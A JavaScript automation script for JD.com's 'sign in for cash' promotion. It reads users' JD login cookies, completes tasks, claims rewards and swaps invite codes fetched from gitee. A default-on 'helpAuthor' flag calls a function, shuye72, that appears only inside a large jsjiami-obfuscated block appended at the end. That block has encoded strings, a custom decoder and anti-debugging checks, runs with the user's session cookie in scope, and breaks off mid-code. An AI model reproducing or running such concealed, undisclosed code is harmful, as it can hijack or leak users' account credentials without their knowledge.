/*
签到领现金，每日2毛～5毛
可互助，助力码每日不变，只变日期
活动入口：京东APP搜索领现金进入
已支持IOS双京东账号,Node.js支持N个京东账号
脚本兼容: QuantumultX, Surge, Loon, JSBox, Node.js
============Quantumultx===============
[task_local]
#签到领现金
2 0-23/4 * * * https://gitee.com/lxk0301/jd_scripts/raw/master/jd_cash.js, tag=签到领现金, img-url=https://raw.githubusercontent.com/Orz-3/mini/master/Color/jd.png, enabled=true

================Loon==============
[Script]
cron "2 0-23/4 * * *" script-path=https://gitee.com/lxk0301/jd_scripts/raw/master/jd_cash.js,tag=签到领现金

===============Surge=================
签到领现金 = type=cron,cronexp="2 0-23/4 * * *",wake-system=1,timeout=3600,script-path=https://gitee.com/lxk0301/jd_scripts/raw/master/jd_cash.js

============小火箭=========
签到领现金 = type=cron,script-path=https://gitee.com/lxk0301/jd_scripts/raw/master/jd_cash.js, cronexpr="2 0-23/4 * * *", timeout=3600, enable=true
 */
const $ = new Env('签到领现金');
const notify = $.isNode() ? require('./sendNotify') : '';
//Node.js用户请在jdCookie.js处填写京东ck;
const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
let jdNotify = true;//是否关闭通知，false打开通知推送，true关闭通知推送
//IOS等用户直接用NobyDa的jd cookie
let cookiesArr = [], cookie = '', message;
let helpAuthor = true;
const randomCount = $.isNode() ? 20 : 5;
let t = +new Date()
const inviteCodes = [
  ``,
  ``
]
if ($.isNode()) {
  Object.keys(jdCookieNode).forEach((item) => {
    cookiesArr.push(jdCookieNode[item])
  })
  if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {};
} else {
  cookiesArr = [$.getdata('CookieJD'), $.getdata('CookieJD2'), ...jsonParse($.getdata('CookiesJD') || "[]").map(item => item.cookie)].filter(item => !!item);
}
const JD_API_HOST = 'https://api.m.jd.com/client.action';
let allMessage = '';
!(async () => {
  if (!cookiesArr[0]) {
    $.msg($.name, '【提示】请先获取京东账号一cookie\n直接使用NobyDa的京东签到获取', 'https://bean.m.jd.com/bean/signIndex.action', {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});
    return;
  }
  await requireConfig()
  await getAuthorShareCode();
  for (let i = 0; i < cookiesArr.length; i++) {
    if (cookiesArr[i]) {
      cookie = cookiesArr[i];
      $.UserName = decodeURIComponent(cookie.match(/pt_pin=(.+?);/) && cookie.match(/pt_pin=(.+?);/)[1])
      $.index = i + 1;
      $.isLogin = true;
      $.nickName = '';
      message = '';
      await TotalBean();
      console.log(`\n******开始【京东账号${$.index}】${$.nickName || $.UserName}*********\n`);
      if (!$.isLogin) {
        $.msg($.name, `【提示】cookie已失效`, `京东账号${$.index} ${$.nickName || $.UserName}\n请重新登录获取\nhttps://bean.m.jd.com/bean/signIndex.action`, {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});

        if ($.isNode()) {
          await notify.sendNotify(`${$.name}cookie已失效 - ${$.UserName}`, `京东账号${$.index} ${$.UserName}\n请重新登录获取cookie`);
        }
        continue
      }
      if(helpAuthor){
        await shuye72()
      }
      await jdCash()
    }
  }
  if (allMessage) {
    if ($.isNode() && (process.env.CASH_NOTIFY_CONTROL ? process.env.CASH_NOTIFY_CONTROL === 'false' : !!1)) await notify.sendNotify($.name, allMessage);
    $.msg($.name, '', allMessage);
  }
})()
    .catch((e) => {
      $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
    })
    .finally(() => {
      $.done();
    })
async function jdCash() {
  await index()
  await shareCodesFormat()
  await helpFriends()
  await getReward()
  await getReward('2')
  await index(true)
  await showMsg()
}
function index(info=false) {
  return new Promise((resolve) => {
    $.get(taskUrl("cash_mob_home",), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if(data.code===0 && data.data.result){
              if(info){
                if (message) {
                  message += `当前现金：${data.data.result.signMoney}元`;
                  allMessage += `京东账号${$.index}${$.nickName}\n${message}${$.index !== cookiesArr.length ? '\n\n' : ''}`;
                }
                message += `当前现金：${data.data.result.signMoney}元`;
                return
              }
              // console.log(`您的助力码为${data.data.result.inviteCode}`)
              console.log(`\n【京东账号${$.index}（${$.nickName || $.UserName}）的${$.name}好友互助码】${data.data.result.inviteCode}\n`);
              let helpInfo = {
                'inviteCode': data.data.result.inviteCode,
                'shareDate': data.data.result.shareDate
              }
              $.shareDate = data.data.result.shareDate;
              // $.log(`shareDate: ${$.shareDate}`)
              // console.log(helpInfo)
              for(let task of data.data.result.taskInfos){
                if (task.type === 4) {
                  for (let i = task.doTimes; i < task.times; ++i) {
                    console.log(`去做${task.name}任务 ${i+1}/${task.times}`)
                    await doTask(task.type, task.jump.params.skuId)
                    await $.wait(5000)
                  }
                }
                else if (task.type === 2) {
                  for (let i = task.doTimes; i < task.times; ++i) {
                    console.log(`去做${task.name}任务 ${i+1}/${task.times}`)
                    await doTask(task.type, task.jump.params.shopId)
                    await $.wait(5000)
                  }
                }
                else if (task.type === 16 || task.type===3 || task.type===5 || task.type===17 || task.type===21) {
                  for (let i = task.doTimes; i < task.times; ++i) {
                    console.log(`去做${task.name}任务 ${i+1}/${task.times}`)
                    await doTask(task.type, task.jump.params.url)
                    await $.wait(5000)
                  }
                }
              }
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}
async function helpFriends() {
  $.canHelp = true
  for (let code of $.newShareCodes) {
    console.log(`去帮助好友${code['inviteCode']}`)
    await helpFriend(code)
    if(!$.canHelp) break
    await $.wait(1000)
  }
  // if (helpAuthor && $.authorCode) {
  //   for(let helpInfo of $.authorCode){
  //     console.log(`去帮助好友${helpInfo['inviteCode']}`)
  //     await helpFriend(helpInfo)
  //     if(!$.canHelp) break
  //     await $.wait(1000)
  //   }
  // }
}
function helpFriend(helpInfo) {
  return new Promise((resolve) => {
    $.get(taskUrl("cash_mob_assist", {...helpInfo,"source":1}), (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if( data.code === 0 && data.data.bizCode === 0){
              console.log(`助力成功，获得${data.data.result.cashStr}`)
              // console.log(data.data.result.taskInfos)
            } else if (data.data.bizCode===207){
              console.log(data.data.bizMsg)
              $.canHelp = false
            } else{
              console.log(data.data.bizMsg)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}
function doTask(type,taskInfo) {
  return new Promise((resolve) => {
    $.get(taskUrl("cash_doTask",{"type":type,"taskInfo":taskInfo}), (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if( data.code === 0){
              console.log(`任务完成成功`)
              // console.log(data.data.result.taskInfos)
            }else{
              console.log(data)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}
function getReward(source = 1) {
  return new Promise((resolve) => {
    $.get(taskUrl("cash_mob_reward",{"source": Number(source),"rewardNode":""}), (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.code === 0 && data.data.bizCode === 0) {
              console.log(`领奖成功，${data.data.result.shareRewardTip}【${data.data.result.shareRewardAmount}】`)
              message += `领奖成功，${data.data.result.shareRewardTip}【${data.data.result.shareRewardAmount}元】\n`;
              // console.log(data.data.result.taskInfos)
            } else {
              // console.log(`领奖失败，${data.data.bizMsg}`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}

function showMsg() {
  return new Promise(resolve => {
    if (!jdNotify) {
      $.msg($.name, '', `${message}`);
    } else {
      $.log(`京东账号${$.index}${$.nickName}\n${message}`);
    }
    resolve()
  })
}
function readShareCode() {
  console.log(`开始`)
  return new Promise(async resolve => {
    $.get({url: "https://gitee.com/Soundantony/RandomShareCode/raw/master/JD_Cash.json",headers:{
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1 Edg/87.0.4280.88"
      }}, async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (data) {
            console.log(`随机取助力码放到您固定的互助码后面(不影响已有固定互助)`)
            data = JSON.parse(data);
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
    await $.wait(10000);
    resolve()
  })
}
//格式化助力码
function shareCodesFormat() {
  return new Promise(async resolve => {
    // console.log(`第${$.index}个京东账号的助力码:::${$.shareCodesArr[$.index - 1]}`)
    $.newShareCodes = [];
    if ($.shareCodesArr[$.index - 1]) {
      $.newShareCodes = $.shareCodesArr[$.index - 1].split('@');
    } else {
      console.log(`由于您第${$.index}个京东账号未提供shareCode,将采纳本脚本自带的助力码\n`)
      const tempIndex = $.index > inviteCodes.length ? (inviteCodes.length - 1) : ($.index - 1);
      $.newShareCodes = inviteCodes[tempIndex].split('@');
      let authorCode = deepCopy($.authorCode)
      $.newShareCodes = [...(authorCode.map((item, index) => authorCode[index] = item['inviteCode'])), ...$.newShareCodes];
    }
    const readShareCodeRes = await readShareCode();
    if (readShareCodeRes && readShareCodeRes.code === 200) {
      $.newShareCodes = [...new Set([...$.newShareCodes, ...(readShareCodeRes.data || [])])];
    }
    $.newShareCodes.map((item, index) => $.newShareCodes[index] = { "inviteCode": item, "shareDate": $.shareDate })
    console.log(`第${$.index}个京东账号将要助力的好友${JSON.stringify($.newShareCodes)}`)
    resolve();
  })
}

function requireConfig() {
  return new Promise(resolve => {
    console.log(`开始获取${$.name}配置文件\n`);
    let shareCodes = [];
    if ($.isNode()) {
      if (process.env.JD_CASH_SHARECODES) {
        if (process.env.JD_CASH_SHARECODES.indexOf('\n') > -1) {
          shareCodes = process.env.JD_CASH_SHARECODES.split('\n');
        } else {
          shareCodes = process.env.JD_CASH_SHARECODES.split('&');
        }
      }
    }
    console.log(`共${cookiesArr.length}个京东账号\n`);
    $.shareCodesArr = [];
    if ($.isNode()) {
      Object.keys(shareCodes).forEach((item) => {
        if (shareCodes[item]) {
          $.shareCodesArr.push(shareCodes[item])
        }
      })
    }
    console.log(`您提供了${$.shareCodesArr.length}个账号的${$.name}助力码\n`);
    resolve()
  })
}
function deepCopy(obj) {
  let objClone = Array.isArray(obj) ? [] : {};
  if (obj && typeof obj === "object") {
    for (let key in obj) {
      if (obj.hasOwnProperty(key)) {
        //判断ojb子元素是否为对象，如果是，递归复制
        if (obj[key] && typeof obj[key] === "object") {
          objClone[key] = deepCopy(obj[key]);
        } else {
          //如果不是，简单复制
          objClone[key] = obj[key];
        }
      }
    }
  }
  return objClone;
}
function taskUrl(functionId, body = {}) {
  return {
    url: `${JD_API_HOST}?functionId=${functionId}&body=${escape(JSON.stringify(body))}&appid=CashRewardMiniH5Env&appid=9.1.0`,
    headers: {
      'Cookie': cookie,
      'Host': 'api.m.jd.com',
      'Connection': 'keep-alive',
      'Content-Type': 'application/json',
      'Referer': 'http://wq.jd.com/wxapp/pages/hd-interaction/index/index',
      'User-Agent': $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0"),
      'Accept-Language': 'zh-cn',
      'Accept-Encoding': 'gzip, deflate, br',
    }
  }
}

function getAuthorShareCode(url = "https://gitee.com/Soundantony/updateTeam/raw/master/shareCodes/jd_updateCash.json") {
  return new Promise(resolve => {
    $.get({url, headers:{
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1 Edg/87.0.4280.88"
      }}, async (err, resp, data) => {
      $.authorCode = [];
      try {
        if (err) {
        } else {
          $.authorCode = JSON.parse(data)
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function TotalBean() {
  return new Promise(async resolve => {
    const options = {
      "url": `https://wq.jd.com/user/info/QueryJDUserInfo?sceneval=2`,
      "headers": {
        "Accept": "application/json,text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-cn",
        "Connection": "keep-alive",
        "Cookie": cookie,
        "Referer": "https://wqs.jd.com/my/jingdou/my.shtml?sceneval=2",
        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0")
      }
    }
    $.post(options, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (data) {
            data = JSON.parse(data);
            if (data['retcode'] === 13) {
              $.isLogin = false; //cookie过期
              return
            }
            if (data['retcode'] === 0) {
              $.nickName = (data['base'] && data['base'].nickname) || $.UserName;
            } else {
              $.nickName = $.UserName
            }
          } else {
            console.log(`京东服务器返回空数据`)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function safeGet(data) {
  try {
    if (typeof JSON.parse(data) == "object") {
      return true;
    }
  } catch (e) {
    console.log(e);
    console.log(`京东服务器访问数据为空，请检查自身设备网络情况`);
    return false;
  }
}
function jsonParse(str) {
  if (typeof str == "string") {
    try {
      return JSON.parse(str);
    } catch (e) {
      console.log(e);
      $.msg($.name, '', '请勿随意在BoxJs输入框修改内容\n建议通过脚本去获取cookie')
      return [];
    }
  }
}
var _0xodP='jsjiami.com.v6',_0x8367=[_0xodP,'wrDCkMKkZcOJ','RMO1w7M2wpU=','w5nCli9XwrjCp8OfUcOoBsOXZQ==','TA5ZGMOiwq5zwqEEw7bDp8Orw4zDn8O5KQgQbU3Dr8KGw6vDpsOxw57CtB7Ckmcpw5go','IMOjwr3CgQvDkcOmBnVyCsO/w65KSsKLUERLw5jDiMK7wr0hwqHCvMOnw6pjcQPDj8OIcMO1','w55HSzZNNsOcYMO6fsK4CnLDvVjDnFc=','wonDsMKuwpRoVcOaw4hNw7I=','GsOVw7oMwplVw6VxwpPCi8Kkw5rDo8KtEBp5woYYwpLCisKIEcKNwqk+wohBw7VKcMKnKQ==','wrQ0w5zDoz58w4TCt3tOwqDDmmw=','wptTw5bCuQ==','w6/DrMK0cSrCtsOxwp7CsF0Qd0vCvFXDrMKFwo0BJ8KHQMKeSXzCvcKYw4HDhGFZRcOdN8K5JcKSBT7CmxDCli0Ic8KDw48mcX/Cmw48wrkQXGXCpcOMdsKSX8ORwo3DrS92wqQ0w4Vkw6jDn8O2bcK1wrk=','GH1ZAEQ=','wpnCmVTDiVhgw4ED','wpJ2w7TCljYiHMOtcSwNwogYX8Oww4ZIw6zDvcKvD8OlekvDpQ==','wqHDkF1LWw==','w6t6ey8w','wqrDukzDiXs=','ccKsfFnDqw==','XcKew7TDtMKe','HMKnwrg/wrQ=','MX7DgjpLUg==','SBBf','wqTCqRPCnsOLEsOBPHFswqUPwpQ=','Ci8H','wrbCtcKJPmBmwosAPcKpI8OBNA==','w4pUdjcn','AS1+w4DCuA==','wrvCvgnCmcOHFsOUJn5/','w57CmsKSw5DCiHPCmQ==','woTDqCAGAQ==','L8KrwqfDvVfDjFI=','w71ISSEv','IFzDpwVm','QcKcw6nDpsK0D8OcwpnCncO8w4jDuWh2w7PDrMOtwolqw5bDusK2wpVlV8KgwqDCgMO3QAbCmcOmwokIFcKif2HDn8O9XylSDsOpXR9awqrDpMO/bMODe8OQf8KWXXDClsK7JSI=','DRTCicOPHQ==','dsOgw6kAwrbDi8OQYxk1e2EcwpQgw6/Dg0h/wo7DikfColBDw6rDkcKjw7cxw4LDpzMEEmokw67ClcOTUsOiW8O/w6PCn8Oyw5vCunHCuMK2LsOXw7Jfw61swrbDvsOjHcKDTMOTwrFuJCPDvcOaw5wbR8O0WUDCgcKLK8KDYsKIccOXwoBWwpxZW3F5w6fCjMK2eijCp07CrhwcwqLDvSfDgUUuwrPDjsODTEQVwqvCuAEWWQLChMKPeMOHwo7DrkHCjsOUXMOiw4TDgcKRYmvDqm1dA8Kww6nDucOKd8ObH8OHR21LXgE4BksXw6Zow55lw5vCmkBOKV7DisKiw6k/Y8OIwp4tNsOUIsKFw5vDiVsEGcKHwqPDkivCvcKZ','JsOzOFPDjMOxHcKzb8KuNUJ8wqd8wrBDTlrDosK1fnMPw5JqNFzCoMO9ES4Sw5Yiw5EUDcOBKcKFwrgcKMO/RT7DhsKrccOhwqbDqcOJw5IbwojDuMOZGBTCosKDdsO7N0zDj8Otw7k8w5DCncOZwovCkknDlsO5wpNlU8Kzw4XDsxbDj8OqwoHDjlXChklRw7LClHF8w7oFRQ==','w4jCsjjDtg==','wqEpU8OKw6o=','worCk2RWwrI=','wqXCgcKYKUM=','wpbCvn1Awr8=','YMO5w7AEwrk=','IMKJwqfDmkI=','PhDCr8OrMA==','H8O8w7wYwpw=','w4BMw6vDtDg=','RMKGw5zDpMKv','w4HDrcKlRQ8=','wqF4w7DCjA==','wrTDmMKnwpUD','w7l4w4bDmjw=','wpzCm1bDsVs=','wrAfL8OIw40=','DnoT','NmzDoTA=','DT95PeitvOayj+Wko+i3sO+9oeitruahieacoee/pei0nemFg+iuiw==','bMOmw5tnwpo=','c8OYw5orwoA=','PmjCpsKAAg==','wpbDkCcQCQ==','wp4jwoTCnkg=','woATMcOOw4A=','LgcDH8O2','wokJQMKvwo4=','w7XDqcKncj8=','w4xyRSAj','FWDDrgdD','w7/DgMK+YsOT','wqLDgXRAfA==','w5cgw6tLw6c=','N8KNwo8uwpNU','wo0ebw==','w70hbcK9','e8Kjwrgi6KyW5rGk5aej6Lem77+y6K+U5qOo5p2b57676LeJ6YSo6K6T','Jk7DkRJF','w7PCphVVwo5S','w6nCnsKSw7LCuQ==','wqjDjmp+QQ==','w5HDn8KdcC0=','wrtBw4/CvsOi','w6jDusK+Qzk=','w5DCkjIJwqbCs8KaGsKhDMOMbcKCwrjCixbDqsOPw4AlUmDCs2JlYsOFcsKWwoTDi2lqwqF/woXCuMOtwqYfw48sG1jDolPCkz0Kw7DDg8KdZ8K5w5Yew4o2ZS3DpRd9w4QEw4jDnjk=','LUnCksK3w7Ynw5XDsyZswozDusOpcRfDgHdLBEzChX1/w6sRN8KIVcK1wolME8ObO8OiwoxrJsODWMOxF8KdwpjDg34aw7vDvA7CjcOHw4NawoleFjETw5UcL14WfsOKMxnDnjtlw4HChMOHwpEAS15Sw5bCuh8hw4ZFwp55aUfDqMO2XsKofsOUNcKrw61YenbCrMKMw5AMAsKuwoLDjnnDkUDDi8KHNsKfw5bDoMOuCmjDrHxEOiNVw6kBwrHDlnPDksOEJMOswpLDuSwdw4TCr8K+CMKQTMOhdMKTwrDDsMKbR0XDuMOE','w5s1ecKxGQ==','XMKew7rDo8K9','w5RaaSQK','w7FKw5HDlws=','wqrDoMKywo0S','wpfDo8KswpE/','ChjCucO4Kg==','w5PCuCVcwqQ=','C2/DqSBg','w7lnHcOyw5Q=','woLCrcKbeMOw','w4hYw67DiCk=','w4/Cq8K0w67Cjw==','wqYwNw==','PWPDhTht','E1bCr8K2w7M=','ecOjw6c=','w7tOA8Ob','wpjCpxYw6Kyi5rOL5aaE6LSQ77+K6K6S5qG45p+t57626LW56YSl6K6s','wpgHIMOuw4M=','w4oQRMK5HQ==','w4lybhIY','wo3DucKCwosQ','wo3CmUPDg3pxw7w=','wrE0McOzw7A=','a8Oxw6Zqwrc=','worCjDjCqsOfMsOn','wrbDhsKIw5QMw60=','YzECeGU=','w51cVicmc8OM','wrbCilVJwqZMw7o3wofDkGUWwqM=','N8KHwoYMwpVO','wrBuw5HCtMOl','wqPCucKgScOP','b8Klw6nDlcK+','aMKwfXfDncO3','wpXDvULDrHPCg8KmEsKnbMOLw4XCiw==','Wh9AAA==','w41BPMOyw5Q=','w6p6w7vDgx4=','wo7Cm3RNwpY=','NwLCp8OwLw==','Okw4MmE=','DEnCjw==','wpMhwqbCkQ==','eH3CrMKH6K6t5rKA5aev6LeY776r6Kyn5qGd5p+T576z6LSc6YW06KyW','EANmw7XCnA==','wqF2w7HCi8Om','AzTCjMOkFsK1','KMOLw5wYwoY=','KVMSMUA=','w6vCvB5lwrQ=','JMKHwrzDvXg=','wq4qbsOdw6U=','jsMCyRjiNEawmiOfP.Ucuome.v6J=='];(function(_0x4041a2,_0x4e49d3,_0xff9e8d){var _0x4a2ffe=function(_0x1160e1,_0x4a1025,_0x5a61e2,_0x905579,_0x260679){_0x4a1025=_0x4a1025>>0x8,_0x260679='po';var _0x284ad1='shift',_0x5b60ad='push';if(_0x4a1025<_0x1160e1){while(--_0x1160e1){_0x905579=_0x4041a2[_0x284ad1]();if(_0x4a1025===_0x1160e1){_0x4a1025=_0x905579;_0x5a61e2=_0x4041a2[_0x260679+'p']();}else if(_0x4a1025&&_0x5a61e2['replace'](/[MCyRNEwOfPUueJ=]/g,'')===_0x4a1025){_0x4041a2[_0x5b60ad](_0x905579);}}_0x4041a2[_0x5b60ad](_0x4041a2[_0x284ad1]());}return 0x7a1cb;};var _0x1f4df6=function(){var _0x39d26f={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0x152634,_0x35b11d,_0x43b25,_0x318dee){_0x318dee=_0x318dee||{};var _0x9c2650=_0x35b11d+'='+_0x43b25;var _0x323bec=0x0;for(var _0x323bec=0x0,_0x16e6d7=_0x152634['length'];_0x323bec<_0x16e6d7;_0x323bec++){var _0x53e7e2=_0x152634[_0x323bec];_0x9c2650+=';\x20'+_0x53e7e2;var _0x72d56b=_0x152634[_0x53e7e2];_0x152634['push'](_0x72d56b);_0x16e6d7=_0x152634['length'];if(_0x72d56b!==!![]){_0x9c2650+='='+_0x72d56b;}}_0x318dee['cookie']=_0x9c2650;},'removeCookie':function(){return'dev';},'getCookie':function(_0x2f23ef,_0x20d11c){_0x2f23ef=_0x2f23ef||function(_0x402680){return _0x402680;};var _0x14175e=_0x2f23ef(new RegExp('(?:^|;\x20)'+_0x20d11c['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));var _0x5c5c35=typeof _0xodP=='undefined'?'undefined':_0xodP,_0x62f998=_0x5c5c35['split'](''),_0x31f8ff=_0x62f998['length'],_0x5cec07=_0x31f8ff-0xe,_0x22e6ac;while(_0x22e6ac=_0x62f998['pop']()){_0x31f8ff&&(_0x5cec07+=_0x22e6ac['charCodeAt']());}var _0x233721=function(_0x10deb7,_0x37aee6,_0x3924e1){_0x10deb7(++_0x37aee6,_0x3924e1);};_0x5cec07^-_0x31f8ff===-0x524&&(_0x22e6ac=_0x5cec07)&&_0x233721(_0x4a2ffe,_0x4e49d3,_0xff9e8d);return _0x22e6ac>>0x2===0x14b&&_0x14175e?decodeURIComponent(_0x14175e[0x1]):undefined;}};var _0x12bfe6=function(){var _0x3b3d7d=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return _0x3b3d7d['test'](_0x39d26f['removeCookie']['toString']());};_0x39d26f['updateCookie']=_0x12bfe6;var _0x3ab851='';var _0x28da03=_0x39d26f['updateCookie']();if(!_0x28da03){_0x39d26f['setCookie'](['*'],'counter',0x1);}else if(_0x28da03){_0x3ab851=_0x39d26f['getCookie'](null,'counter');}else{_0x39d26f['removeCookie']();}};_0x1f4df6();}(_0x8367,0x110,0x11000));var _0x1398=function(_0x5d1e59,_0x40e773){_0x5d1e59=~~'0x'['concat'](_0x5d1e59);var _0x1f4797=_0x8367[_0x5d1e59];if(_0x1398['NUMkNH']===undefined){(function(){var _0x51197d;try{var _0x43e67b=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x51197d=_0x43e67b();}catch(_0x3c1b09){_0x51197d=window;}var _0x52cfc3='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x51197d['atob']||(_0x51197d['atob']=function(_0x4e5746){var _0x503706=String(_0x4e5746)['replace'](/=+$/,'');for(var _0x454bf2=0x0,_0x47e344,_0x5483ae,_0x160a63=0x0,_0x166152='';_0x5483ae=_0x503706['charAt'](_0x160a63++);~_0x5483ae&&(_0x47e344=_0x454bf2%0x4?_0x47e344*0x40+_0x5483ae:_0x5483ae,_0x454bf2++%0x4)?_0x166152+=String['fromCharCode'](0xff&_0x47e344>>(-0x2*_0x454bf2&0x6)):0x0){_0x5483ae=_0x52cfc3['indexOf'](_0x5483ae);}return _0x166152;});}());var _0x1151d1=function(_0x25eca7,_0x40e773){var _0x391ad7=[],_0x4ddaca=0x0,_0x3576e8,_0xf6b6d7='',_0x139564='';_0x25eca7=atob(_0x25eca7);for(var _0x1cc36f=0x0,_0x1bd271=_0x25eca7['length'];_0x1cc36f<_0x1bd271;_0x1cc36f++){_0x139564+='%'+('00'+_0x25eca7['charCodeAt'](_0x1cc36f)['toString'](0x10))['slice'](-0x2);}_0x25eca7=decodeURIComponent(_0x139564);for(var _0x8bbb53=0x0;_0x8bbb53<0x100;_0x8bbb53++){_0x391ad7[_0x8bbb53]=_0x8bbb53;}for(_0x8bbb53=0x0;_0x8bbb53<0x100;_0x8bbb53++){_0x4ddaca=(_0x4ddaca+_0x391ad7[_0x8bbb53]+_0x40e773['charCodeAt'](_0x8bbb53%_0x40e773['length']))%0x100;_0x3576e8=_0x391ad7[_0x8bbb53];_0x391ad7[_0x8bbb53]=_0x391ad7[_0x4ddaca];_0x391ad7[_0x4ddaca]=_0x3576e8;}_0x8bbb53=0x0;_0x4ddaca=0x0;for(var _0x53d161=0x0;_0x53d161<_0x25eca7['length'];_0x53d161++){_0x8bbb53=(_0x8bbb53+0x1)%0x100;_0x4ddaca=(_0x4ddaca+_0x391ad7[_0x8bbb53])%0x100;_0x3576e8=_0x391ad7[_0x8bbb53];_0x391ad7[_0x8bbb53]=_0x391ad7[_0x4ddaca];_0x391ad7[_0x4ddaca]=_0x3576e8;_0xf6b6d7+=String['fromCharCode'](_0x25eca7['charCodeAt'](_0x53d161)^_0x391ad7[(_0x391ad7[_0x8bbb53]+_0x391ad7[_0x4ddaca])%0x100]);}return _0xf6b6d7;};_0x1398['GbLlLa']=_0x1151d1;_0x1398['LRTugK']={};_0x1398['NUMkNH']=!![];}var _0x380459=_0x1398['LRTugK'][_0x5d1e59];if(_0x380459===undefined){if(_0x1398['MWkxWQ']===undefined){var _0x521a66=function(_0x16cbf3){this['NQlNXe']=_0x16cbf3;this['bPnKFL']=[0x1,0x0,0x0];this['TLMHKl']=function(){return'newState';};this['krirRX']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['gYxrJd']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x521a66['prototype']['uQjxrf']=function(){var _0x7a1ca=new RegExp(this['krirRX']+this['gYxrJd']);var _0x3daa05=_0x7a1ca['test'](this['TLMHKl']['toString']())?--this['bPnKFL'][0x1]:--this['bPnKFL'][0x0];return this['rWERJN'](_0x3daa05);};_0x521a66['prototype']['rWERJN']=function(_0x2246ca){if(!Boolean(~_0x2246ca)){return _0x2246ca;}return this['oTHOBB'](this['NQlNXe']);};_0x521a66['prototype']['oTHOBB']=function(_0x261c1c){for(var _0x28dcc5=0x0,_0x3f5c9c=this['bPnKFL']['length'];_0x28dcc5<_0x3f5c9c;_0x28dcc5++){this['bPnKFL']['push'](Math['round'](Math['random']()));_0x3f5c9c=this['bPnKFL']['length'];}return _0x261c1c(this['bPnKFL'][0x0]);};new _0x521a66(_0x1398)['uQjxrf']();_0x1398['MWkxWQ']=!![];}_0x1f4797=_0x1398['GbLlLa'](_0x1f4797,_0x40e773);_0x1398['LRTugK'][_0x5d1e59]=_0x1f4797;}else{_0x1f4797=_0x380459;}return _0x1f4797;};var _0x30dc62=function(){var _0x2699a9=!![];return function(_0x501e82,_0x5b6c40){var _0xa3de42=_0x2699a9?function(){if(_0x5b6c40){var _0x26a748=_0x5b6c40['apply'](_0x501e82,arguments);_0x5b6c40=null;return _0x26a748;}}:function(){};_0x2699a9=![];return _0xa3de42;};}();var _0xc733ff=_0x30dc62(this,function(){var _0x164f12=function(){return'\x64\x65\x76';},_0xa1edbe=function(){return'\x77\x69\x6e\x64\x6f\x77';};var _0x47a72a=function(){var _0x276699=new RegExp('\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d');return!_0x276699['\x74\x65\x73\x74'](_0x164f12['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x1d98d7=function(){var _0x593ed1=new RegExp('\x28\x5c\x5c\x5b\x78\x7c\x75\x5d\x28\x5c\x77\x29\x7b\x32\x2c\x34\x7d\x29\x2b');return 